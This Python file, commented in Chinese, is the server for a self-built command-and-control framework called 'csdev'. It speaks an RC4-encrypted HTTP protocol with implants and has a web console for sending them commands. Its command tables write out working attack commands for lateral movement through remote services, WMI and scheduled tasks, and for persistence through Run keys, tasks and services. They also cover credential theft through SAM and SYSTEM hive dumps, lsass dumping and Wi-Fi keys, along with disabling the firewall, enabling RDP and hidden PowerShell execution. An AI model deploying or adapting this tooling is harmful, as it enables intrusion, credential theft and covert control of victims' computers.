#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
csdev :: server.py  --  自研 C2 服务端 (HTTP 通道 + Web UI)

与 Cobalt Strike 完全无关的独立实现。植入体为自研的
  kits/beacon/win_beacon.c   (Windows)
  linux/beacon.c             (Linux)
两者共用同一套协议。

协议 (与植入体严格对齐):
    握手  植入体 POST /report   body = [4B magic][4B len][RC4(host_info)]
    取任务 植入体 POST /task     body = [4B magic][4B len=0][RC4("")]
          服务端响应             body = [4B magic][4B len][RC4(cmd)]
    回传  植入体 POST /result   body = [4B len][RC4(output)]
    magic = 0x4B52424B  ("KBRK")

Web API (给浏览器 UI 用):
    GET  /                      Web UI
    GET  /api/sessions          会话列表
    GET  /api/output?sid=X      取该会话输出
    POST /api/command           {sid, cmd}  下发命令
    POST /api/kill              {sid}       结束会话

用法:
    python server.py --port 8443
    python server.py --port 8443 --host 0.0.0.0
"""

import argparse
import base64
import json
import os
import socket
import struct
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

PROTO_MAGIC = 0x4B52424B
SESSION_KEY = bytes([0x91, 0x3a, 0x77, 0xc4, 0x0e, 0x5b, 0xd2, 0x18,
                     0x6f, 0xa3, 0x44, 0xbc, 0x27, 0xe8, 0x05, 0x9d])


def rc4(data: bytes, key: bytes) -> bytes:
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    out = bytearray(len(data))
    i = j = 0
    for n in range(len(data)):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out[n] = data[n] ^ s[(s[i] + s[j]) & 0xFF]
    return bytes(out)



def decode_out(raw: bytes) -> str:
    """windows 命令输出多为 GBK/OEM 编码, 依次尝试解码"""
    for enc in ("utf-8", "gbk", "big5", "cp936", "latin-1"):
        try:
            return raw.decode(enc)
        except Exception:
            continue
    return raw.decode("utf-8", "replace")



# ---------------------------------------------------------------- 命令别名层
# 把 C2 风格的命令映射为 Windows 原生命令。未命中的原样交给 cmd.exe。
_SCREENSHOT_PS = (
    'powershell -c "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;'
    '$s=[Windows.Forms.SystemInformation]::VirtualScreen;'
    '$b=New-Object Drawing.Bitmap $s.Width,$s.Height;'
    '$g=[Drawing.Graphics]::FromImage($b);'
    '$g.CopyFromScreen($s.Left,$s.Top,0,0,$b.Size);'
    '$p=$env:TEMP+\'\\_\'+[guid]::NewGuid().ToString(\'N\').Substring(0,8)+\'.png\';'
    '$b.Save($p);Write-Output $p"'
)

_NATIVE_PREFIX = ("ps", "download ", "upload ", "exit")



# ------------------------------------------------ 横向移动 / 持久化 / 凭据
# 追加到别名表 (由 patch_full 注入)
_T2 = {}


def _psexec(r: str) -> str:
    """psexec <host> <cmd> —— 通过临时服务远程执行"""
    if not r:
        return "echo usage: psexec <host> <cmd>"
    p = r.split(None, 1)
    host = p[0]
    cmd = p[1] if len(p) > 1 else "cmd.exe"
    return (
        'sc \\\\%s create csdsvc binPath= "cmd /c %s" start= demand'
        ' & sc \\\\%s start csdsvc & timeout /t 3 >nul'
        ' & sc \\\\%s delete csdsvc'
    ) % (host, cmd, host, host)


def _lateral():
    """横向移动类命令"""
    return {
        # psexec <host> <cmd>  —— 通过 SC 远程起服务
        "psexec": lambda r: _psexec(r),
        # wmiexec
        "wmiexec": lambda r: (
            'wmic /node:"%s" process call create "cmd.exe /c %s"'
        ) % tuple((r.split(None, 1) + [""])[:2]) if r else "echo usage: wmiexec <host> <cmd>",
        # 远程命令执行
        "atexec": lambda r: (
            'schtasks /s %s /create /tn csdtask /tr "cmd /c %s" /sc once /st 00:00 '
            '& schtasks /s %s /run /tn csdtask'
        ) % tuple((r.split(None, 1) + ["", ""])[:3]) if r else "echo usage: atexec <host> <cmd>",
        # 共享与连接
        "netuse":   lambda r: 'net use \\\\%s\\admin$' % r,
        "netdel":   lambda r: 'net use \\\\%s\\admin$ /del' % r,
        "netview":  lambda r: 'net view \\\\%s' % r,
        # 会话枚举
        "loggedon": lambda r: 'query user /server:%s' % r if r else "query user",
        "quser":    lambda: "query user",
        "qprocess": lambda r: 'query process /server:%s' % r if r else "query process",
        "share":    lambda r: 'net view \\\\%s /all' % r,
        # 服务控制
        "svc_start": lambda r: "sc start " + r,
        "svc_stop":  lambda r: "sc stop " + r,
        "svc_query": lambda r: "sc query " + r,
        "svc_delete": lambda r: "sc delete " + r,
        "svc_create": lambda r: 'sc create csdsvc binPath= "%s"' % r,
        # RDP
        "rdp":      lambda: 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
    }

def _persist():
    """持久化类命令"""
    return {
        # 注册表 Run
        "persist_reg": lambda r: (
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v WndSvc /t REG_SZ /d "%s" /f' % (r or "SELF")
        ),
        "persist_reg2": lambda r: (
            'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v WndSvc /t REG_SZ /d "%s" /f' % (r or "SELF")
        ),
        # 计划任务
        "persist_task": lambda r: (
            'schtasks /create /tn WndSvc /tr "%s" /sc onlogon /rl highest /f' % (r or "SELF")
        ),
        "persist_task_h": lambda r: (
            'schtasks /create /tn WndSvc /tr "%s" /sc minute /mo 30 /f' % (r or "SELF")
        ),
        # 服务
        "persist_svc": lambda r: (
            'sc create WndSvc binPath= "%s" start= auto & sc start WndSvc' % (r or "SELF")
        ),
        # WMI 事件订阅 (无文件)
        "persist_wmi": lambda r: 'powershell -c "Write-Output \'WMI subscription requires explicit payload path: %s\'"' % r,
        # 启动目录
        "persist_startup": lambda r: (
            'copy /y "%s" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WndSvc.exe"' % (r or "SELF")
        ),
        # 枚举与清理
        "persist_list": lambda: (
            'echo [Run keys] & reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '& reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '& echo [Tasks] & schtasks /query /fo LIST | findstr /i "TaskName"'
        ),
        "persist_clean": lambda: (
            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WndSvc /f 2>nul & '
            'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WndSvc /f 2>nul & '
            'schtasks /delete /tn WndSvc /f 2>nul & sc delete WndSvc 2>nul & echo done'
        ),
    }

def _creds():
    """凭据相关"""
    return {
        # 导出 SAM/SYSTEM 供离线解析
        "sam": lambda: (
            'reg save HKLM\\SAM %TEMP%\\s.hiv /y & reg save HKLM\\SYSTEM %TEMP%\\y.hiv /y '
            '& echo saved to %TEMP%\\s.hiv and y.hiv'
        ),
        "hashdump": lambda: 'reg save HKLM\\SAM %TEMP%\\s.hiv /y & reg save HKLM\\SYSTEM %TEMP%\\y.hiv /y & dir %TEMP%\\*.hiv',
        # LSASS 转储 (需要管理员)
        "lsass": lambda: (
            'powershell -c "Add-Type -AssemblyName System.DirectoryServices;'
            '$p=Get-Process lsass;'
            '$d=New-Object Diagnostics.MiniDump.MiniDumpExceptionInformation;'
            'Write-Output (\'lsass PID \'+$p.Id+\' - use procdump for full dump\')"'
        ),
        "procdump": lambda: 'procdump64.exe -accepteula -ma lsass.exe %TEMP%\\l.dmp 2>nul || echo procdump not present',
        # 凭据管理器
        "vault":   lambda: 'vaultcmd /listcreds:"Windows Credentials" /all',
        "credman": lambda: 'cmdkey /list',
        "dpapi":   lambda: 'dir /a %APPDATA%\\Microsoft\\Credentials',
        # 浏览器
        "chrome":  lambda: 'dir /b "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" 2>nul || echo not found',
        "edge":    lambda: 'dir /b "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data" 2>nul || echo not found',
        # 注册表搜索
        "regquery": lambda r: 'reg query %s /s' % (r or "HKLM\\Software"),
        "regsave":  lambda r: 'reg save %s %TEMP%\\reg.hiv /y' % r,
        "regdump":  lambda: 'reg export HKLM\\SAM %TEMP%\\sam.reg /y 2>nul & echo done',
    }

def _proxy():
    """端口转发与代理"""
    return {
        # netsh portproxy (需要管理员)
        "portfwd": lambda r: (
            'netsh interface portproxy add v4tov4 listenport=%s connectaddress=%s'
        ) % tuple((r.split() + ["", ""])[:2]) if r else "echo usage: portfwd <lport> <raddr>",
        "portfwd_del": lambda r: 'netsh interface portproxy delete v4tov4 listenport=%s' % r,
        "portfwd_list": lambda: 'netsh interface portproxy show all',
        # 简易端口扫描 (PowerShell, 无需植入体实现)
        "portscan": lambda r: (
            'powershell -c "$t=\'%s\';'
            '$h,$p=$t.Split(\':\');'
            '$r=1..1024 | %%{ $c=New-Object Net.Sockets.TcpClient;'
            'try{$c.Connect($h,$_);Write-Output (\'open \'+$_);$c.Close()}catch{} }"'
        ) % (r or "127.0.0.1:1"),
        "fw_off": lambda: "netsh advfirewall set allprofiles state off",
        "fw_on":  lambda: "netsh advfirewall set allprofiles state on",
        "fw_list": lambda: "netsh advfirewall firewall show rule name=all",
    }

def _inject():
    """注入与执行"""
    return {
        # PowerShell 反射加载 shellcode
        "inject_ps": lambda r: (
            'powershell -c "$b=[Convert]::FromBase64String(\'%s\');'
            '$a=[Reflection.Assembly]::Load($b);'
            'Write-Output \'assembly loaded\'"' % r
        ) if r else "echo usage: inject_ps <base64_assembly>",
        # rundll32 执行导出
        "rundll": lambda r: 'rundll32 %s' % r,
        "regsvr": lambda r: 'regsvr32 /s %s' % r,
        # 程序集执行
        "execute_assembly": lambda r: (
            'powershell -c "$b=[IO.File]::ReadAllBytes(\'%s\');'
            '[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@())"' % r
        ) if r else "echo usage: execute_assembly <path>",
        # powershell 编码执行
        "psh": lambda r: 'powershell -nop -w hidden -c "%s"' % r,
        "psh_enc": lambda r: 'powershell -nop -w hidden -enc %s' % r,
        # 计划任务执行 (绕过 UAC 提示)
        "elevate": lambda r: 'powershell -c "Start-Process -Verb RunAs -FilePath \'%s\'"' % r,
    }

_T2.update(_lateral())
_T2.update(_persist())
_T2.update(_creds())
_T2.update(_proxy())
_T2.update(_inject())


def map_command(cmd: str) -> str:
    c = cmd.strip()
    if not c:
        return c
    low = c.lower()

    # 原生命令直接透传 (由植入体处理)。
    # 注意只能用精确匹配: 若对 "ps" 用 startswith, psexec/psh 会被误判透传。
    if low in ("ps", "exit") or low.startswith(("download ", "upload ")):
        return c

    parts = c.split(None, 1)
    verb = parts[0].lower()
    rest = parts[1] if len(parts) > 1 else ""
    q = '"%s"' % rest if rest else ""

    T = {
        # ---- 文件与目录 ----
        "pwd":      lambda: "cd",
        "ls":       lambda: ("dir /a " + q) if rest else "dir /a",
        "ll":       lambda: ("dir /a " + q) if rest else "dir /a",
        "cat":      lambda: "type " + q,
        "type":     lambda: "type " + q,
        "head":     lambda: "powershell -c \"Get-Content %s -TotalCount 20\"" % ("'%s'" % rest if rest else "''"),
        "tail":     lambda: "powershell -c \"Get-Content %s -Tail 20\"" % ("'%s'" % rest if rest else "''"),
        "rm":       lambda: "del /f /q " + q,
        "cp":       lambda: 'copy /y "%s"' % rest.replace(" ", '" "', 1),
        "mv":       lambda: 'move /y "%s"' % rest.replace(" ", '" "', 1),
        "mkdir":    lambda: "mkdir " + q,
        "rmdir":    lambda: "rmdir /s /q " + q,
        "find":     lambda: 'dir /s /b ' + q,
        "search":   lambda: 'findstr /s /i /m "%s" *' % rest,
        "hash":     lambda: 'certutil -hashfile %s SHA256' % q,
        # ---- 进程与服务 ----
        "kill":     lambda: "taskkill /F /PID " + rest,
        "tasklist": lambda: "tasklist /v",
        "services": lambda: "sc query type= service state= all",
        "drivers":  lambda: "driverquery /v",
        # ---- 系统信息 ----
        "whoami":   lambda: "whoami /all",
        "sysinfo":  lambda: "systeminfo",
        "env":      lambda: "set",
        "date":     lambda: "date /t & time /t",
        "uptime":   lambda: "net statistics workstation | findstr /i since",
        "drives":   lambda: "wmic logicaldisk get name,size,freespace,caption",
        "hotfix":   lambda: "wmic qfe get hotfixid,installedon",
        "av":       lambda: 'wmic /namespace:\\\\root\\\\SecurityCenter2 path AntiVirusProduct get displayName,productState',
        # ---- 网络 ----
        "ipconfig": lambda: "ipconfig /all",
        "ifconfig": lambda: "ipconfig /all",
        "netstat":  lambda: "netstat -ano",
        "arp":      lambda: "arp -a",
        "route":    lambda: "route print",
        "dns":      lambda: "ipconfig /displaydns",
        "ping":     lambda: "ping -n 4 " + rest,
        "tracert":  lambda: "tracert -h 5 " + rest,
        "firewall": lambda: "netsh advfirewall show allprofiles",
        # ---- 账户与域 ----
        "users":    lambda: "net user",
        "groups":   lambda: "net localgroup",
        "shares":   lambda: "net share",
        "sessions": lambda: "net session",
        "domains":  lambda: "net view /domain",
        "dc":       lambda: "nltest /dclist:",
        "trust":    lambda: "nltest /domain_trusts",
        # ---- 凭据与窃取 ----
        "wifi":     lambda: "netsh wlan show profiles",
        "wifikey":  lambda: 'netsh wlan show profile "%s" key=clear' % rest,
        "clip":     lambda: "powershell -c Get-Clipboard",
        "savedcred": lambda: "cmdkey /list",
        "history":  lambda: "powershell -c \"Get-Content (Get-PSReadlineOption).HistorySavePath\"",
        # ---- 操作 ----
        "screenshot": lambda: _SCREENSHOT_PS,
        "clipset":  lambda: "powershell -c \"Set-Clipboard '%s'\"" % rest,
        "msg":      lambda: "msg * " + rest,
        "download": lambda: "download " + rest,
        "shell":    lambda: rest,
        # ---- 会话 ----
        "sleep":    lambda: "sleep " + rest,
        "exit":     lambda: "exit",
        "clear":    lambda: "cls",
        # ---- 电源 ----
        "shutdown": lambda: "shutdown /s /t 0",
        "reboot":   lambda: "shutdown /r /t 0",
        "logoff":   lambda: "shutdown /l",
        "lock":     lambda: "rundll32 user32.dll,LockWorkStation",
    }

    T.update(_T2)          # 合并横向/持久化/凭据/代理/注入
    if verb in T:
        # 主表用无参 lambda, 扩展表用单参 lambda (接收 rest), 两种都要兼容
        f = T[verb]
        try:
            return f()
        except TypeError:
            try:
                return f(rest)
            except Exception:
                return c
        except Exception:
            return c
    return c



class Session:
    def __init__(self, sid, info, addr, ident=""):
        self.sid = sid
        self.ident = ident
        self.host = info.get("host", "?")
        self.user = info.get("user", "?")
        self.arch = info.get("arch", "?")
        self.addr = addr
        self.first_seen = time.time()
        self.last_seen = time.time()
        self.pending = None          # 待下发的命令
        self.output = []             # 历史输出
        self.alive = True

    def to_dict(self):
        return {
            "sid": self.sid,
            "host": self.host,
            "user": self.user,
            "arch": self.arch,
            "addr": self.addr,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "idle": int(time.time() - self.last_seen),
            "pending": self.pending is not None,
        }


class C2State:
    def __init__(self):
        self.sessions = {}
        self.by_ident = {}
        self.lock = threading.Lock()
        self.counter = 0

    def get_or_create(self, addr, info=None, ident=""):
        with self.lock:
            # 用植入体上报的 ident (host|user) 匹配 —— 不能用源地址:
            # WinHTTP 每次请求可能使用不同的源端口
            if ident and ident in self.by_ident:
                s = self.sessions.get(self.by_ident[ident])
                if s:
                    s.last_seen = time.time()
                    s.alive = True
                    return s
            self.counter += 1
            sid = "S%03d" % self.counter
            info = info or {}
            s = Session(sid, info, addr, ident)
            self.sessions[sid] = s
            if ident:
                self.by_ident[ident] = sid
            log("[+] 新会话 %s  %s\\%s  arch=%s  id=%s"
                % (sid, info.get("host", "?"), info.get("user", "?"),
                   info.get("arch", "?"), ident))
            return s
            self.counter += 1
            sid = "S%03d" % self.counter
            info = info or {}
            s = Session(sid, info, addr)
            self.sessions[sid] = s
            log("[+] 新会话 %s  %s\\%s  (%s)  arch=%s"
                % (sid, info.get("host", "?"), info.get("user", "?"),
                   addr, info.get("arch", "?")))
            return s

    def push_output(self, sid, text):
        with self.lock:
            if sid in self.sessions:
                self.sessions[sid].output.append((time.time(), text))


STATE = C2State()
VERBOSE = True


def log(msg):
    if VERBOSE:
        sys.stdout.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), msg))
        sys.stdout.flush()


def parse_hostinfo(raw: str):
    """植入体上报格式: host|user|arch"""
    parts = raw.split("|")
    return {
        "host": parts[0] if len(parts) > 0 else "?",
        "user": parts[1] if len(parts) > 1 else "?",
        "arch": parts[2] if len(parts) > 2 else "?",
    }


class Handler(BaseHTTPRequestHandler):
    server_version = "csdev"

    def log_message(self, fmt, *args):
        pass  # 静音默认访问日志

    # ---------- 辅助 ----------
    def _body(self):
        n = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(n) if n > 0 else b""

    def _reply(self, code, data=b"", ctype="application/octet-stream"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        if data:
            self.wfile.write(data)

    def _json(self, obj):
        self._reply(200, json.dumps(obj, ensure_ascii=False).encode("utf-8"),
                    "application/json; charset=utf-8")

    @property
    def peer(self):
        return "%s:%d" % self.client_address

    @property
    def ident(self):
        """植入体通过 X-Id 头上报的身份 (host|user)"""
        return self.headers.get("X-Id", "")

    # ---------- 植入体接口 ----------
    def do_POST(self):
        path = urlparse(self.path).path
        body = self._body()

        if path == "/report":
            if len(body) < 8:
                return self._reply(200, b"")
            magic, ln = struct.unpack(">II", body[:8])
            if magic != PROTO_MAGIC or ln == 0 or ln > len(body) - 8:
                return self._reply(200, b"")
            info = parse_hostinfo(decode_out(rc4(body[8:8 + ln], SESSION_KEY)))
            s = STATE.get_or_create(self.peer, info, self.ident)
            STATE.push_output(s.sid, "[*] 会话建立  %s\\%s  arch=%s"
                              % (s.host, s.user, s.arch))
            return self._reply(200, b"OK")

        if path == "/task":
            sid = STATE.by_ident.get(self.ident)
            with STATE.lock:
                s = STATE.sessions.get(sid) if sid else None
            if s is None:
                return self._reply(200, b"")
            s.last_seen = time.time()
            with STATE.lock:
                cmd = s.pending
                s.pending = None
            if not cmd:
                return self._reply(200, b"")
            payload = rc4(cmd.encode("utf-8"), SESSION_KEY)
            hdr = struct.pack(">II", PROTO_MAGIC, len(payload))
            log("[>] %s <- %s" % (s.sid, cmd))
            return self._reply(200, hdr + payload)

        if path == "/result":
            if len(body) < 4:
                return self._reply(200, b"")
            ln = struct.unpack(">I", body[:4])[0]
            if ln == 0 or ln > len(body) - 4:
                return self._reply(200, b"")
            out = decode_out(rc4(body[4:4 + ln], SESSION_KEY))
            _sid = STATE.by_ident.get(self.ident)
            with STATE.lock:
                s = STATE.sessions.get(_sid) if _sid else None
            if s:
                STATE.push_output(s.sid, out)
                log("[<] %s 回传 %d 字节" % (s.sid, ln))
            return self._reply(200, b"OK")

        # ---- Web API: 下发命令 ----
        if path == "/api/command":
            try:
                obj = json.loads(body.decode("utf-8"))
                sid = obj.get("sid", "")
                cmd = obj.get("cmd", "")
            except Exception:
                return self._json({"ok": False, "error": "bad json"})
            if not sid or not cmd:
                return self._json({"ok": False, "error": "missing sid/cmd"})
            with STATE.lock:
                s = STATE.sessions.get(sid)
                if not s:
                    return self._json({"ok": False, "error": "no such session"})
                s.pending = map_command(cmd)
            STATE.push_output(sid, "> " + cmd)
            log("[>] %s 下发: %s" % (sid, cmd))
            return self._json({"ok": True})

        if path == "/api/kill":
            try:
                obj = json.loads(body.decode("utf-8"))
                sid = obj.get("sid", "")
            except Exception:
                return self._json({"ok": False, "error": "bad json"})
            with STATE.lock:
                s = STATE.sessions.get(sid)
                if s:
                    s.pending = "exit"
            return self._json({"ok": True})

        return self._reply(404, b"")

    # ---------- Web API ----------
    def do_GET(self):
        u = urlparse(self.path)
        path = u.path

        if path in ("/", "/index.html"):
            html = UI_HTML.encode("utf-8")
            return self._reply(200, html, "text/html; charset=utf-8")

        if path == "/api/sessions":
            with STATE.lock:
                lst = [s.to_dict() for s in STATE.sessions.values()]
            lst.sort(key=lambda x: x["sid"])
            return self._json({"ok": True, "sessions": lst})

        if path == "/api/output":
            q = parse_qs(u.query)
            sid = (q.get("sid") or [""])[0]
            since = int((q.get("since") or ["0"])[0])
            with STATE.lock:
                s = STATE.sessions.get(sid)
                if not s:
                    return self._json({"ok": False, "error": "no such session"})
                items = [(t, txt) for (t, txt) in s.output if t >= since]
                total = len(s.output)
            return self._json({"ok": True, "items": items, "total": total})

        return self._reply(404, b"")


def run_server(host, port):
    srv = ThreadingHTTPServer((host, port), Handler)
    log("csdev C2 服务端已启动")
    log("  Web UI   : http://%s:%d/" % (host if host != "0.0.0.0" else "127.0.0.1", port))
    log("  植入体回连 : http://%s:%d/  (protocol KBRK)" % (host, port))
    log("  密钥     : %s" % SESSION_KEY.hex())
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        log("收到中断, 退出")


UI_HTML = r"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>csdev C2 控制台</title>
<style>
:root{
  --bg:#0d1117; --panel:#161b22; --panel2:#1c2128; --line:#30363d;
  --fg:#c9d1d9; --dim:#8b949e; --accent:#58a6ff; --ok:#3fb950;
  --warn:#d29922; --err:#f85149; --mono:'Cascadia Code','JetBrains Mono',Consolas,monospace;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--fg);font:14px/1.5 -apple-system,'Segoe UI',sans-serif;height:100vh;display:flex;flex-direction:column;overflow:hidden}
header{display:flex;align-items:center;gap:16px;padding:12px 20px;background:var(--panel);border-bottom:1px solid var(--line)}
header h1{font-size:15px;font-weight:600;letter-spacing:.5px}
header h1 span{color:var(--accent)}
.stat{font-size:12px;color:var(--dim)}
.stat b{color:var(--ok);font-weight:600}
main{flex:1;display:flex;min-height:0}
aside{width:280px;background:var(--panel);border-right:1px solid var(--line);overflow-y:auto;flex-shrink:0}
aside h2{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--dim);padding:14px 16px 8px}
.sess{padding:10px 16px;border-left:3px solid transparent;cursor:pointer;border-bottom:1px solid var(--line)}
.sess:hover{background:var(--panel2)}
.sess.on{background:var(--panel2);border-left-color:var(--accent)}
.sess .t{display:flex;align-items:center;gap:8px;font-weight:600;font-size:13px}
.dot{width:8px;height:8px;border-radius:50%;background:var(--ok);box-shadow:0 0 6px var(--ok)}
.sess .m{font-size:11px;color:var(--dim);margin-top:3px;font-family:var(--mono)}
.sess .g{font-size:10px;color:var(--accent);margin-top:2px}
section{flex:1;display:flex;flex-direction:column;min-width:0}
.bar{display:flex;align-items:center;gap:10px;padding:10px 16px;background:var(--panel);border-bottom:1px solid var(--line)}
.bar .id{font-family:var(--mono);color:var(--accent);font-weight:600}
.bar .path{flex:1;color:var(--dim);font-size:12px}
.term{flex:1;overflow-y:auto;padding:16px;font-family:var(--mono);font-size:13px;white-space:pre-wrap;word-break:break-all;background:var(--bg)}
.term .l{margin-bottom:2px;color:var(--fg)}
.term .l.cmd{color:var(--accent)}
.term .l.sys{color:var(--dim);font-style:italic}
.term .l.err{color:var(--err)}
.inp{display:flex;gap:8px;padding:12px 16px;background:var(--panel);border-top:1px solid var(--line)}
.inp input{flex:1;background:var(--panel2);border:1px solid var(--line);color:var(--fg);padding:9px 12px;border-radius:6px;font-family:var(--mono);font-size:13px;outline:none}
.inp input:focus{border-color:var(--accent)}
.inp button{background:var(--accent);color:#0d1117;border:0;padding:9px 20px;border-radius:6px;font-weight:600;cursor:pointer;font-size:13px}
.inp button:hover{filter:brightness(1.1)}
.empty{flex:1;display:flex;align-items:center;justify-content:center;color:var(--dim);font-size:13px;flex-direction:column;gap:8px}
.empty .big{font-size:40px;opacity:.3}
</style>
</head>
<body>
<header>
  <h1>csdev <span>C2</span> 控制台</h1>
  <div class="stat">会话 <b id="cnt">0</b></div>
  <div class="stat">状态 <b id="st">就绪</b></div>
</header>
<main>
  <aside>
    <h2>会话列表</h2>
    <div id="list"></div>
  </aside>
  <section id="sec">
    <div class="empty"><div class="big">&#9679;</div><div>等待植入体回连…</div></div>
  </section>
</main>

<script>
let sessions = {};
let cur = null;      // 当前会话 sid
let seen = 0;        // 输出已读总数
let lastTs = 0;      // 增量时间戳

function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

async function pollSessions(){
  try{
    const r = await fetch('/api/sessions');
    const j = await r.json();
    const list = document.getElementById('list');
    document.getElementById('cnt').textContent = j.sessions.length;
    let html = '';
    for(const s of j.sessions){
      html += `<div class="sess ${s.sid===cur?'on':''}" onclick="pick('${s.sid}')">
        <div class="t"><span class="dot"></span>${esc(s.host)}</div>
        <div class="m">${esc(s.user)}@${esc(s.host)} :${esc(s.addr.split(':').pop())}</div>
        <div class="g">${s.sid} · ${esc(s.arch)} · ${s.idle}s前</div>
      </div>`;
    }
    list.innerHTML = html;
    document.getElementById('st').textContent = '监听中';
  }catch(e){ document.getElementById('st').textContent = '服务端离线'; }
}

function pick(sid){
  if(cur !== sid){ cur = sid; seen = 0; lastTs = 0; render(); }
  pollOutput();
}

function render(){
  const sec = document.getElementById('sec');
  if(!cur){
    sec.innerHTML = '<div class="empty"><div class="big">&#9679;</div><div>等待植入体回连…</div></div>';
    return;
  }
  const s = sessions[cur] || {};
  sec.innerHTML = `
    <div class="bar">
      <span class="id">${cur}</span>
      <span class="path">${esc(s.host||'')} \\ ${esc(s.user||'')} &nbsp;|&nbsp; 命令直接回车执行（默认走 cmd.exe / shell）</span>
    </div>
    <div class="term" id="term"></div>
    <div class="inp">
      <input id="c" placeholder="输入命令，回车下发…" autocomplete="off">
      <button onclick="send()">发送</button>
    </div>`;
  document.getElementById('c').addEventListener('keydown', e=>{
    if(e.key==='Enter') send();
  });
}

async function pollOutput(){
  if(!cur) return;
  try{
    const r = await fetch(`/api/output?sid=${cur}&since=${lastTs}`);
    const j = await r.json();
    if(!j.ok) return;
    if(j.items && j.items.length){
      const t = document.getElementById('term');
      if(!t) return;
      for(const [ts, txt] of j.items){
        lastTs = Math.max(lastTs, ts);
        const d = document.createElement('div');
        d.className = 'l';
        d.textContent = txt.replace(/\r/g,'');
        t.appendChild(d);
      }
      t.scrollTop = t.scrollHeight;
    }
  }catch(e){}
}

async function send(){
  const el = document.getElementById('c');
  const cmd = el.value.trim();
  if(!cmd || !cur) return;
  el.value = '';
  const t = document.getElementById('term');
  const d = document.createElement('div');
  d.className = 'l cmd';
  d.textContent = '> ' + cmd;
  t.appendChild(d);
  t.scrollTop = t.scrollHeight;
  await fetch('/api/command', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({sid: cur, cmd: cmd})
  });
}

setInterval(pollSessions, 2000);
setInterval(pollOutput, 1000);
pollSessions();
</script>
</body>
</html>
"""


def main():
    ap = argparse.ArgumentParser(description="csdev C2 服务端")
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=8443)
    ap.add_argument("-q", "--quiet", action="store_true")
    a = ap.parse_args()
    global VERBOSE
    VERBOSE = not a.quiet
    run_server(a.host, a.port)


if __name__ == "__main__":
    main()
